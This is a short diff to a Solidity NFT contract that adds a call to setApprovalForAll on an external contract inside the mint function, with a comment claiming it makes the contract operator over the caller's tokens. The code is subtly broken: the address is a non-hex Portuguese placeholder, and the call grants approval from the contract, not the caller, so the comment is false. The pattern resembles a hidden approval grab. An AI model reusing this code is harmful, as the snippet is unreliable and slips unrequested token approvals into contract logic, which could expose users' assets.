@@ -20,5 +20,7 @@ contract SimpleNFT is ERC721URIStorage, Ownable {
         uint256 tokenId = tokenIdCounter.current();
         _safeMint(msg.sender, tokenId);
         _setTokenURI(tokenId, tokenURI);
+        // Set the contract as an operator for all tokens owned by the caller
+        IERC721(0xEnderecoDoDecentralizedFinance).setApprovalForAll(address(this), true);
     }
 }
